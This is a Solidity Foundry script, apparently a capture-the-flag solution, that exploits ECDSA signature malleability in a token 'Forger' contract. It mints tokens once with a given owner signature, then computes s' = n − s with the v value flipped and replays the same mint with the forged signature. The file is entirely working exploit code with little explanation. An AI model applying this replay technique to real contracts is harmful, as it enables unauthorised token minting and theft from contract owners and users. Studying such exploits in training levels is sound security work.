// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IForger {
    function createNewTokensFromOwnerSignature(
        bytes calldata signature,
        address receiver,
        uint256 amount,
        bytes32 salt,
        uint256 deadline
    ) external;
}

contract ForgerExploit is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IForger f = IForger(target);

        // Original signature (given)
        bytes memory sig = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";

        address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
        uint256 amount = 100 ether;
        bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
        uint256 deadline = type(uint256).max;

        // 1. Use original signature
        f.createNewTokensFromOwnerSignature(sig, receiver, amount, salt, deadline);

        // 2. Create malleable signature
        (bytes32 r, bytes32 s, uint8 v) = split(sig);

        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

        bytes32 newS = bytes32(n - uint256(s));
        uint8 newV = (v == 27) ? 28 : 27;

        bytes memory malSig = abi.encodePacked(r, newS, newV);

        // 3. Reuse with malleable signature
        f.createNewTokensFromOwnerSignature(malSig, receiver, amount, salt, deadline);

        vm.stopBroadcast();
    }

    function split(bytes memory sig)
        internal pure returns (bytes32 r, bytes32 s, uint8 v)
    {
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}